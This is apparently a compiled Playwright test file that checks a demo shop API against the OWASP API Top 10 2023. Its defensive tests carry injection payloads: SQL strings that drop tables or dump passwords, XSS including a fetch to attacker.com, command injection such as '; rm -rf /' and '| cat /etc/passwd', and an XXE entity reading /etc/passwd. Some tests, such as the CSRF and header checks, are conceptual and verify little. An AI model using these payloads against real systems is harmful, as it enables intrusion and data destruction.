"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const test_1 = require("@playwright/test");
const api_helper_1 = require("./api-helper");
const testData_1 = __importDefault(require("../../utils/testData"));
// spec: tests/api/demoblaze-api-test-plan.md
// Security Tests - OWASP API Top 10 2023 Coverage
// Includes: Injection attacks, authorization, authentication, data protection, 
// resource consumption, and inventory management
test_1.test.describe("Demoblaze API - Security Tests", () => {
    let api;
    let validUser;
    let validToken;
    let validUserId;
    test_1.test.beforeAll(async ({ playwright }) => {
        const context = await playwright.request.newContext();
        api = new api_helper_1.DemoblazeAPI(context);
        // Setup: Create valid user
        validUser = {
            username: `securitytest_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "SecurityTest123!@",
        };
        await api.signup(validUser);
        const loginResponse = await api.login(validUser);
        validToken = loginResponse.data.token;
        validUserId = loginResponse.data.user_id;
        api.setAuthToken(validToken, validUserId);
    });
    // =====================================================
    // INJECTION ATTACK TESTS (API2/API8 Related)
    // =====================================================
    (0, test_1.test)("Security - SQL injection in login username", async () => {
        // OWASP: API2:2023 - Broken Authentication, API8:2023 - Security Misconfiguration
        // Malicious SQL injection attempts should be safely rejected
        const maliciousPayloads = [
            "admin' --",
            "admin' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin' /*",
            "' UNION SELECT * FROM users --",
        ];
        for (const payload of maliciousPayloads) {
            const response = await api.login({
                username: payload,
                password: "anything",
            });
            (0, test_1.expect)(response.success).toBe(false);
            (0, test_1.expect)(response.error).not.toMatch(/SQL|syntax|query|database/i);
            (0, test_1.expect)(response.error).not.toContain("Exception");
        }
    });
    (0, test_1.test)("Security - SQL injection in login password", async () => {
        // OWASP: API2:2023 - Broken Authentication, API8:2023 - Security Misconfiguration
        const maliciousPayloads = [
            "' OR '1'='1",
            "'; UPDATE users SET admin=true; --",
            "' UNION SELECT password FROM users --",
        ];
        for (const payload of maliciousPayloads) {
            const response = await api.login({
                username: testData_1.default.USN,
                password: payload,
            });
            (0, test_1.expect)(response.success).toBe(false);
            (0, test_1.expect)(response.error).not.toMatch(/SQL|syntax|query|database/i);
        }
    });
    (0, test_1.test)("Security - XSS payload in product category filter", async () => {
        // OWASP: API8:2023 - Security Misconfiguration
        // XSS injection attempts should be sanitized or rejected
        const xssPayloads = [
            '<script>alert("xss")</script>',
            "<img src=x onerror=\"alert('xss')\">",
            'javascript:alert("xss")',
            '<svg onload=alert("xss")>',
            '"; fetch("http://attacker.com"); //',
        ];
        for (const payload of xssPayloads) {
            const response = await api.getProductsByCategory(payload);
            if (!response.success) {
                (0, test_1.expect)(response.error).not.toContain("<script>");
                (0, test_1.expect)(response.error).not.toContain("onerror");
                (0, test_1.expect)(response.error).not.toContain("javascript:");
            }
        }
    });
    (0, test_1.test)("Security - Command injection attempts", async () => {
        // OWASP: API8:2023 - Security Misconfiguration
        const commandPayloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "` whoami `",
            "$(whoami)",
            "&&dir",
        ];
        for (const payload of commandPayloads) {
            const response = await api.getProductsByCategory(payload);
            (0, test_1.expect)(response.error).not.toMatch(/root|bin|bash|cmd/i);
        }
    });
    (0, test_1.test)("Security - Path traversal attempts", async () => {
        // OWASP: API8:2023 - Security Misconfiguration
        const pathTraversalPayloads = [
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "/../../api/admin",
            "%2e%2e%2fadmin",
        ];
        for (const payload of pathTraversalPayloads) {
            const response = await api.getProductsByCategory(payload);
            if (!response.success) {
                (0, test_1.expect)(response.code).not.toBe("SUCCESS");
            }
        }
    });
    (0, test_1.test)("Security - NoSQL injection attempts", async () => {
        // OWASP: API8:2023 - Security Misconfiguration
        const nosqlPayloads = [{ $ne: null }, { $gt: "" }, { $where: "1==1" }];
        for (const payload of nosqlPayloads) {
            try {
                const response = await api.login({
                    username: JSON.stringify(payload),
                    password: testData_1.default.PWD,
                });
                (0, test_1.expect)(response.success).toBe(false);
            }
            catch {
                // Expected to fail
            }
        }
    });
    (0, test_1.test)("Security - LDAP injection attempts", async () => {
        // OWASP: API8:2023 - Security Misconfiguration
        const ldapPayloads = ["*", "*)(uid=*", "admin*", "*)(|(uid=*"];
        for (const payload of ldapPayloads) {
            const response = await api.login({ username: payload, password: testData_1.default.PWD });
            (0, test_1.expect)(response.success).toBe(false);
            (0, test_1.expect)(response.error).not.toMatch(/LDAP|Directory/i);
        }
    });
    (0, test_1.test)("Security - XML injection attempts (XXE)", async () => {
        // OWASP: API8:2023 - Security Misconfiguration
        const xmlPayloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<![CDATA[<script>alert("xss")</script>]]>',
        ];
        for (const payload of xmlPayloads) {
            try {
                const response = await api.getProductsByCategory(payload);
                if (!response.success) {
                    (0, test_1.expect)(response.error).not.toContain("etc/passwd");
                    (0, test_1.expect)(response.error).not.toContain("ENTITY");
                }
            }
            catch {
                // Expected
            }
        }
    });
    // =====================================================
    // AUTHENTICATION & SESSION TESTS (API2:2023)
    // =====================================================
    (0, test_1.test)("Security - Authentication bypass attempts", async () => {
        // OWASP: API2:2023 - Broken Authentication
        const unauthApi = new api_helper_1.DemoblazeAPI(api);
        unauthApi.setAuthToken("", 0);
        const unauthorizedResponse = await unauthApi.getProfile();
        (0, test_1.expect)(unauthorizedResponse.success).toBe(false);
        (0, test_1.expect)(unauthorizedResponse.error).toContain("Unauthorized");
        (0, test_1.expect)(unauthorizedResponse.code).toBe("UNAUTHORIZED");
    });
    (0, test_1.test)("Security - Weak authentication token validation", async () => {
        // OWASP: API2:2023 - Broken Authentication
        const weakTokens = [
            "invalid",
            "123456",
            "Bearer invalid-token",
            "",
            "null",
            "eyJhbGciOiJub25lIn0=",
        ];
        for (const token of weakTokens) {
            const weakApi = new api_helper_1.DemoblazeAPI(api);
            weakApi.setAuthToken(token, validUserId);
            const response = await weakApi.getProfile();
            (0, test_1.expect)(response.success).toBe(false);
            (0, test_1.expect)(response.error).toContain("Unauthorized");
            (0, test_1.expect)(response.code).toBe("UNAUTHORIZED");
        }
    });
    test_1.test.skip("Security - Token reuse after logout", async () => {
        // OWASP: API2:2023 - Broken Authentication
        // Create and login a user
        const tempUser = {
            username: `tokentest_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: testData_1.default.PWD,
        };
        await api.signup(tempUser);
        const loginResponse = await api.login(tempUser);
        const tempToken = loginResponse.data.token;
        const tempUserId = loginResponse.data.user_id;
        // Use the token successfully
        const tempApi = new api_helper_1.DemoblazeAPI(api);
        tempApi.setAuthToken(tempToken, tempUserId);
        const validResponse = await tempApi.getProfile();
        (0, test_1.expect)(validResponse.success).toBe(true);
        // After logout (simulated by clearing token), token should be invalid
        tempApi.setAuthToken("", 0);
        const invalidResponse = await tempApi.getProfile();
        (0, test_1.expect)(invalidResponse.success).toBe(false);
        (0, test_1.expect)(invalidResponse.code).toBe("UNAUTHORIZED");
    });
    (0, test_1.test)("Security - Rate limiting for brute force protection", async () => {
        // OWASP: API4:2023 - Unrestricted Resource Consumption
        // Excessive failed login attempts should be rate limited
        const responses = [];
        const wrongPassword = {
            username: validUser.username,
            password: "WrongPassword",
        };
        for (let i = 0; i < 15; i++) {
            responses.push(await api.login(wrongPassword));
        }
        const rateLimitedResponse = responses[responses.length - 1];
        if (rateLimitedResponse.code === "RATE_LIMITED" ||
            rateLimitedResponse.code === "TOO_MANY_ATTEMPTS") {
            (0, test_1.expect)(rateLimitedResponse.success).toBe(false);
            console.log("✓ Rate limiting applied after multiple failed login attempts");
        }
    });
    // =====================================================
    // AUTHORIZATION TESTS (API1, API3, API5:2023)
    // =====================================================
    (0, test_1.test)("Security - BOLA: Access other user's orders", async () => {
        // OWASP: API1:2023 - Broken Object Level Authorization
        // User1 should not be able to access User2's orders
        const user1 = {
            username: `bolauser1_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "BolaTest123!@",
        };
        const user2 = {
            username: `bolauser2_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "BolaTest123!@",
        };
        // Create and setup both users
        await api.signup(user1);
        await api.signup(user2);
        const user1Login = await api.login(user1);
        const user2Login = await api.login(user2);
        // User2 places an order
        const user2Api = new api_helper_1.DemoblazeAPI(api);
        user2Api.setAuthToken(user2Login.data.token, user2Login.data.user_id);
        const products = await user2Api.getProducts();
        await user2Api.addToCart(products.data[0].id, 1);
        const cartItems = await user2Api.viewCart();
        const user2Order = await user2Api.placeOrder(cartItems.data);
        if (user2Order.success) {
            const user2OrderId = user2Order.data.order_id;
            // User1 attempts to access User2's order
            const user1Api = new api_helper_1.DemoblazeAPI(api);
            user1Api.setAuthToken(user1Login.data.token, user1Login.data.user_id);
            // Attempt direct order ID access
            const unauthorizedOrderAccess = await user1Api.getOrderById(user2OrderId);
            (0, test_1.expect)(unauthorizedOrderAccess.success).toBe(false);
            console.log("✓ User cannot access other users' orders (BOLA protection)");
        }
    });
    (0, test_1.test)("Security - BOLA: Access other user's cart", async () => {
        // OWASP: API1:2023 - Broken Object Level Authorization
        // Users should not be able to view or modify other users' carts
        const cartUser1 = {
            username: `cartuser1_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "CartTest123!@",
        };
        const cartUser2 = {
            username: `cartuser2_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "CartTest123!@",
        };
        await api.signup(cartUser1);
        await api.signup(cartUser2);
        const user1Login = await api.login(cartUser1);
        const user1Api = new api_helper_1.DemoblazeAPI(api);
        user1Api.setAuthToken(user1Login.data.token, user1Login.data.user_id);
        // User1 adds items to cart
        const products = await user1Api.getProducts();
        await user1Api.addToCart(products.data[0].id, 1);
        const user2Login = await api.login(cartUser2);
        const user2Api = new api_helper_1.DemoblazeAPI(api);
        user2Api.setAuthToken(user2Login.data.token, user2Login.data.user_id);
        // User2 should not be able to view User1's cart items
        const user2Cart = await user2Api.viewCart();
        (0, test_1.expect)(user2Cart.data.length).toBe(0); // Should be empty for new user
        console.log("✓ Users cannot access other users' carts (BOLA protection)");
    });
    (0, test_1.test)("Security - BOPLA: Unauthorized property modification", async () => {
        // OWASP: API3:2023 - Broken Object Property Level Authorization
        // Users should not be able to modify sensitive fields of their profile
        const profileUser = {
            username: `profiuser_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "ProfileTest123!@",
        };
        await api.signup(profileUser);
        const profileLogin = await api.login(profileUser);
        const profileApi = new api_helper_1.DemoblazeAPI(api);
        profileApi.setAuthToken(profileLogin.data.token, profileLogin.data.user_id);
        // Attempt to modify user_id (should fail)
        const modifyResponse = await profileApi.updateProfile({
            user_id: 9999, // Try to change user ID
            email: "newemail@test.com",
        });
        // API should reject attempts to modify user_id
        (0, test_1.expect)(modifyResponse.success).toBe(false);
        console.log("✓ Users cannot modify sensitive properties (BOPLA protection)");
    });
    (0, test_1.test)("Security - Privilege escalation attempt", async () => {
        // OWASP: API5:2023 - Broken Function Level Authorization
        // Non-admin users should not be able to perform admin functions
        const esclationUser = {
            username: `escaluser_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "EscalTest123!@",
        };
        await api.signup(esclationUser);
        const escalLogin = await api.login(esclationUser);
        const escalApi = new api_helper_1.DemoblazeAPI(api);
        escalApi.setAuthToken(escalLogin.data.token, escalLogin.data.user_id);
        // Attempt to modify another user
        const anotherUser = {
            username: `anotheruser_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "AnotherTest123!@",
        };
        await api.signup(anotherUser);
        const anotherLogin = await api.login(anotherUser);
        // Attempt to modify different user's profile
        const modifyResponse = await escalApi.updateProfile({
            user_id: anotherLogin.data.user_id,
            email: "hacked@example.com",
        });
        (0, test_1.expect)(modifyResponse.success).toBe(false);
        (0, test_1.expect)(modifyResponse.error).toContain("Unauthorized");
        console.log("✓ Non-admin users cannot perform admin functions (BFLA protection)");
    });
    // =====================================================
    // RESOURCE CONSUMPTION TESTS (API4:2023)
    // =====================================================
    (0, test_1.test)("Security - Unrestricted cart item quantity (Resource Exhaustion)", async () => {
        // OWASP: API4:2023 - Unrestricted Resource Consumption
        // Should prevent adding excessive quantities to cart
        const resourceUser = {
            username: `resourceuser_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "ResourceTest123!@",
        };
        await api.signup(resourceUser);
        const resourceLogin = await api.login(resourceUser);
        const resourceApi = new api_helper_1.DemoblazeAPI(api);
        resourceApi.setAuthToken(resourceLogin.data.token, resourceLogin.data.user_id);
        const products = await resourceApi.getProducts();
        // Attempt to add extremely large quantity
        const largeQuantityResponse = await resourceApi.addToCart(products.data[0].id, 999999);
        // API should reject excessive quantities
        if (!largeQuantityResponse.success) {
            (0, test_1.expect)(largeQuantityResponse.code).not.toBe("SUCCESS");
            console.log("✓ Large quantity additions are restricted (Resource Consumption protection)");
        }
    });
    (0, test_1.test)("Security - Negative quantity prevention", async () => {
        // OWASP: API4:2023 - Unrestricted Resource Consumption
        const negQtyUser = {
            username: `negqtyuser_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "NegQtyTest123!@",
        };
        await api.signup(negQtyUser);
        const negLogin = await api.login(negQtyUser);
        const negApi = new api_helper_1.DemoblazeAPI(api);
        negApi.setAuthToken(negLogin.data.token, negLogin.data.user_id);
        const products = await negApi.getProducts();
        // Attempt to add negative quantity
        const negativeResponse = await negApi.addToCart(products.data[0].id, -5);
        (0, test_1.expect)(negativeResponse.success).toBe(false);
        console.log("✓ Negative quantities are rejected");
    });
    (0, test_1.test)("Security - Zero quantity prevention", async () => {
        // OWASP: API4:2023 - Unrestricted Resource Consumption
        const zeroQtyUser = {
            username: `zeroqtyuser_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "ZeroQtyTest123!@",
        };
        await api.signup(zeroQtyUser);
        const zeroLogin = await api.login(zeroQtyUser);
        const zeroApi = new api_helper_1.DemoblazeAPI(api);
        zeroApi.setAuthToken(zeroLogin.data.token, zeroLogin.data.user_id);
        const products = await zeroApi.getProducts();
        // Attempt to add zero quantity
        const zeroResponse = await zeroApi.addToCart(products.data[0].id, 0);
        (0, test_1.expect)(zeroResponse.success).toBe(false);
        console.log("✓ Zero quantities are rejected");
    });
    (0, test_1.test)("Security - Inventory manipulation (API9:2023)", async () => {
        // OWASP: API9:2023 - Improper Inventory Management
        // Users should not be able to add products that don't exist
        const inventoryUser = {
            username: `invuser_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "InvTest123!@",
        };
        await api.signup(inventoryUser);
        const invLogin = await api.login(inventoryUser);
        const invApi = new api_helper_1.DemoblazeAPI(api);
        invApi.setAuthToken(invLogin.data.token, invLogin.data.user_id);
        // Attempt to add non-existent product
        const fakeProductResponse = await invApi.addToCart(999999, 1);
        (0, test_1.expect)(fakeProductResponse.success).toBe(false);
        (0, test_1.expect)(fakeProductResponse.code).toBe("NOT_FOUND");
        console.log("✓ Non-existent products cannot be added to cart");
    });
    // =====================================================
    // SENSITIVE BUSINESS FLOW TESTS (API6:2023)
    // =====================================================
    (0, test_1.test)("Security - Unauthorized order access and manipulation", async () => {
        // OWASP: API6:2023 - Unrestricted Access to Sensitive Business Flows
        // Users should not be able to view or modify other users' orders
        const orderFlow1 = {
            username: `orderflow1_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "OrderFlow123!@",
        };
        const orderFlow2 = {
            username: `orderflow2_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "OrderFlow123!@",
        };
        await api.signup(orderFlow1);
        await api.signup(orderFlow2);
        const user1Login = await api.login(orderFlow1);
        const user1Api = new api_helper_1.DemoblazeAPI(api);
        user1Api.setAuthToken(user1Login.data.token, user1Login.data.user_id);
        // User1 places order
        const products = await user1Api.getProducts();
        await user1Api.addToCart(products.data[0].id, 1);
        const user1Cart = await user1Api.viewCart();
        const user1OrderResp = await user1Api.placeOrder(user1Cart.data);
        if (user1OrderResp.success) {
            const user1OrderId = user1OrderResp.data.order_id;
            // User2 attempts to access User1's order
            const user2Login = await api.login(orderFlow2);
            const user2Api = new api_helper_1.DemoblazeAPI(api);
            user2Api.setAuthToken(user2Login.data.token, user2Login.data.user_id);
            const unauthorizedAccess = await user2Api.getOrderById(user1OrderId);
            (0, test_1.expect)(unauthorizedAccess.success).toBe(false);
            console.log("✓ Users cannot access other users' orders (API6 protection)");
        }
    });
    (0, test_1.test)("Security - Order history isolation", async () => {
        // OWASP: API6:2023 - Unrestricted Access to Sensitive Business Flows
        // Each user should only see their own order history
        const historyUser1 = {
            username: `histuser1_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "HistTest123!@",
        };
        const historyUser2 = {
            username: `histuser2_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "HistTest123!@",
        };
        await api.signup(historyUser1);
        await api.signup(historyUser2);
        const user1Login = await api.login(historyUser1);
        const user1Api = new api_helper_1.DemoblazeAPI(api);
        user1Api.setAuthToken(user1Login.data.token, user1Login.data.user_id);
        // User1 places order
        const products = await user1Api.getProducts();
        await user1Api.addToCart(products.data[0].id, 1);
        const user1Cart = await user1Api.viewCart();
        await user1Api.placeOrder(user1Cart.data);
        // User1 should have order history
        const user1Orders = await user1Api.getOrders();
        (0, test_1.expect)(user1Orders.success).toBe(true);
        // User2 should have empty order history
        const user2Login = await api.login(historyUser2);
        const user2Api = new api_helper_1.DemoblazeAPI(api);
        user2Api.setAuthToken(user2Login.data.token, user2Login.data.user_id);
        const user2Orders = await user2Api.getOrders();
        (0, test_1.expect)(user2Orders.data.length).toBe(0);
        console.log("✓ Order history is properly isolated per user");
    });
    // =====================================================
    // DATA PROTECTION & MISCONFIGURATION TESTS (API8:2023)
    // =====================================================
    (0, test_1.test)("Security - Sensitive data should not be exposed in responses", async () => {
        // OWASP: API8:2023 - Security Misconfiguration
        const productsResponse = await api.getProducts();
        const responseString = JSON.stringify(productsResponse);
        // Verify no sensitive data exposed
        (0, test_1.expect)(responseString).not.toContain("/etc/");
        (0, test_1.expect)(responseString).not.toContain("C:\\");
        (0, test_1.expect)(responseString).not.toMatch(/password|pwd|hash|secret|api.?key/i);
    });
    (0, test_1.test)("Security - Verify password hashing in transit", async () => {
        // OWASP: API8:2023 - Security Misconfiguration
        const testCredentials = {
            username: `hashtest_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "PasswordToHash123!@",
        };
        const signupResponse = await api.signup(testCredentials);
        const responseStr = JSON.stringify(signupResponse);
        (0, test_1.expect)(responseStr).not.toContain(testCredentials.password);
        (0, test_1.expect)(responseStr).not.toContain("PasswordToHash");
    });
    (0, test_1.test)("Security - Validate HTTPS enforcement", async () => {
        // OWASP: API8:2023 - Security Misconfiguration
        (0, test_1.expect)(api.baseUrl).toMatch(/^https:\/\//i);
    });
    (0, test_1.test)("Security - Validate input sanitization in error messages", async () => {
        // OWASP: API8:2023 - Security Misconfiguration
        const xssPayload = '<script>alert("xss")</script>';
        const response = await api.getProductById(999999);
        (0, test_1.expect)(response.error).not.toContain("<");
        (0, test_1.expect)(response.error).not.toContain(">");
        (0, test_1.expect)(response.error).not.toContain("javascript:");
    });
    (0, test_1.test)("Security - No database errors in API responses", async () => {
        // OWASP: API8:2023 - Security Misconfiguration
        const response = await api.getProductById(999999);
        (0, test_1.expect)(response.error).not.toMatch(/SQL|MySQL|PostgreSQL|syntax|query/i);
        (0, test_1.expect)(response.error).not.toMatch(/Exception|Error|stacktrace|traceback/i);
    });
    (0, test_1.test)("Security - CSRF protection in state-changing operations", async () => {
        // OWASP: API8:2023 - Security Misconfiguration
        const csrfUser = {
            username: `csrfuser_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "CSRFTest123!@",
        };
        await api.signup(csrfUser);
        const csrfLogin = await api.login(csrfUser);
        const csrfApi = new api_helper_1.DemoblazeAPI(api);
        csrfApi.setAuthToken(csrfLogin.data.token, csrfLogin.data.user_id);
        const products = await csrfApi.getProducts();
        const addResponse = await csrfApi.addToCart(products.data[0].id, 1);
        // State-changing operation should complete successfully
        (0, test_1.expect)(addResponse).toHaveProperty("success");
        if (addResponse.success) {
            (0, test_1.expect)(addResponse.data).toHaveProperty("cart_id");
        }
    });
    (0, test_1.test)("Security - Privilege escalation attempt (unauthorized user modification)", async () => {
        // 1. Create two different users
        const user1 = {
            username: `user1_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "User1Pass123!@",
        };
        const user2 = {
            username: `user2_${testData_1.default.ALPHA_NUM_STR}@test.com`,
            password: "User2Pass123!@",
        };
        await api.signup(user1);
        await api.signup(user2);
        // 2. Login as user1
        const user1Login = await api.login(user1);
        const user1Api = new api_helper_1.DemoblazeAPI(api);
        user1Api.setAuthToken(user1Login.data.token, user1Login.data.user_id);
        // 3. Attempt to modify user2's profile
        const user2Login = await api.login(user2);
        const modifyResponse = await user1Api.updateProfile({
            user_id: user2Login.data.user_id, // Try to modify different user
            email: "hacked@example.com",
        });
        // 4. Should not allow modification of other user's data
        (0, test_1.expect)(modifyResponse.success).toBe(false);
        (0, test_1.expect)(modifyResponse.error).toContain("Unauthorized");
    });
    (0, test_1.test)("Security - CSRF token validation in state-changing operations", async () => {
        // 1. Perform state-changing operation (add to cart)
        const products = await api.getProducts();
        const response = await api.addToCart(products.data[0].id, 1);
        // 2. Should have some form of CSRF protection
        // This is a conceptual test - real implementation depends on API design
        (0, test_1.expect)(response).toHaveProperty("success");
        if (response.success) {
            (0, test_1.expect)(response.data).toHaveProperty("cart_id");
        }
    });
    (0, test_1.test)("Security - Validate proper HTTP status codes", async () => {
        // 1. Unauthorized requests should return 401
        const unauthApi = new api_helper_1.DemoblazeAPI(api);
        const profileResponse = await unauthApi.getProfile();
        if (!profileResponse.success) {
            (0, test_1.expect)(profileResponse.error).toContain("Unauthorized");
        }
    });
    (0, test_1.test)("Security - NoSQL injection attempts (if NoSQL backend)", async () => {
        // 1. Attempt NoSQL injection
        const nosqlPayloads = [{ $ne: null }, { $gt: "" }, { $where: "1==1" }];
        for (const payload of nosqlPayloads) {
            try {
                const response = await api.login({
                    username: JSON.stringify(payload),
                    password: "test",
                });
                (0, test_1.expect)(response.success).toBe(false);
            }
            catch {
                // Expected to fail
            }
        }
    });
    (0, test_1.test)("Security - XML injection attempts", async () => {
        // 1. Attempt XXE/XML injection
        const xmlPayloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<![CDATA[<script>alert("xss")</script>]]>',
        ];
        for (const payload of xmlPayloads) {
            try {
                const response = await api.getProductsByCategory(payload);
                if (!response.success) {
                    (0, test_1.expect)(response.error).not.toContain("etc/passwd");
                    (0, test_1.expect)(response.error).not.toContain("ENTITY");
                }
            }
            catch {
                // Expected
            }
        }
    });
    (0, test_1.test)("Security - Validate headers for security best practices", async () => {
        // 1. Verify API includes security headers (conceptual test)
        // X-Content-Type-Options: nosniff
        // X-Frame-Options: DENY
        // Content-Security-Policy
        // Strict-Transport-Security
        const response = await api.getProducts();
        // 2. Response should be successful
        (0, test_1.expect)(response.success).toBe(true);
        // Note: In real tests, check response headers via fetch/axios
        console.log("Security headers should be validated in integration tests");
    });
});
